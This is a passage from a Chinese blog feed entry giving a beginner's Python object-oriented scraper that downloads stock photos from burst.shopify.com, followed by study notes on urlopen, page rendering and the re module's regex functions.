class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tupian</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.base_url=<span class="string">&quot;https://burst.shopify.com/love?page=&#123;&#125;&quot;</span></span><br><span class="line">        self.header=&#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">                     &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Geturl</span>(<span class="params">self</span>):</span></span><br><span class="line">        all_url = []</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">            all_url.append(self.base_url.<span class="built_in">format</span>(<span class="built_in">str</span>))</span><br><span class="line">        <span class="keyword">return</span> all_url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Respons</span>(<span class="params">self,all_url</span>):</span></span><br><span class="line">        text_list = []</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> all_url:</span><br><span class="line">            r = requests.get(url, headers=self.header)</span><br><span class="line">            text_list.append(r.text)</span><br><span class="line">        <span class="keyword">return</span> text_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clear</span>(<span class="params">self, respons</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> respons:</span><br><span class="line">            qqq = <span class="string">&quot;https://burst.*?jpg&quot;</span></span><br><span class="line">            pi = re.findall(qqq, i)</span><br><span class="line">            lst=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> pi:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(j)</span><br><span class="line">            <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">self, url_list</span>):</span></span><br><span class="line">        x=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            x = x + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            file_name = <span class="string">&quot;E:/大学/python面向对象爬虫/&quot;</span>+ <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">            urlretrieve(url, file_name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        titile_url = self.Geturl()</span><br><span class="line">        respons = self.Respons(titile_url)</span><br><span class="line">        picture = self.clear(respons)</span><br><span class="line">        <span class="built_in">print</span>(picture)</span><br><span class="line">        download = self.save(picture)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tupian = Tupian()</span><br><span class="line">    tupian.run()</span><br></pre></td></tr></table></figure><h1 id="爬虫笔记："><a href="#爬虫笔记：" class="headerlink" title="爬虫笔记："></a>爬虫笔记：</h1><h2 id="抓取网页源代码"><a href="#抓取网页源代码" class="headerlink" title="抓取网页源代码"></a>抓取网页源代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">url =<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">resp = urlopen(url)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;my baidu.html&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#把读取的数据放入一个html文件里</span></span><br><span class="line">    f.write(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))<span class="comment">#读取到页面源代码</span></span><br></pre></td></tr></table></figure><h2 id="Web请求过程剖析"><a href="#Web请求过程剖析" class="headerlink" title="Web请求过程剖析"></a>Web请求过程剖析</h2><ul><li>服务器渲染：在服务器那边直接把数据和html整合在一起，统一返回给浏览器</li></ul><ul><li> 客户端渲染：第一次请求只要一个html护甲，第二次请求拿到数据，进行数据展示，也就是在页面源    代码中看不到数据。（因为超链接，已经进入下一个网页）</li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p><img src="https://www.hualigs.cn/image/6080384636f52.jpg" alt="正则表达式"></p><p><img src="https://www.hualigs.cn/image/6080393d36a4d.jpg" alt="正则表达式"></p><p>​    <strong>.*?   尽可能少的匹配中间字符</strong></p><h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><ul><li><p>findall：匹配字符串中所有的符合正则的内容列表，效率不高）</p></li><li><p>finditer：匹配字符串中所有的内容【返回的是迭代器】，从迭代器中拿到内容需要.group()</p><p>​            <code>it = re.finditer(&quot;&quot;,&quot;&quot;)</code></p><p>​            <code>for i in it :</code></p><p>​        <code>print(i,group())</code></p></li><li><p>search：找到一个结果就返回，返回的结果是match对象，拿数据需要.group()</p></li><li><p>预加载正则表达式</p><p>​        <code>obj = re.compile(&quot;\d&quot;)</code></p><p>​        <code>xx=obj.finditer/search()</code></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;普通面向对象（爬取burst-shopify-com下的图片）&quot;&gt;&lt;a href=&quot;#普通面向对象（爬取burst-shopify-com下的图片）&quot; class=&quot;headerlink&quot; title=&quot;普通面向对象（爬取burst.shopify.com下的图片</summary>
      
    
    
    
    <category term="-Python" scheme="https://abinix.top/categories/Python/"/>
    
    
    <category term="-爬虫 -面向对象" scheme="https://abinix.top/tags/%E7%88%AC%E8%99%AB-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
  </entry>
  
</feed>
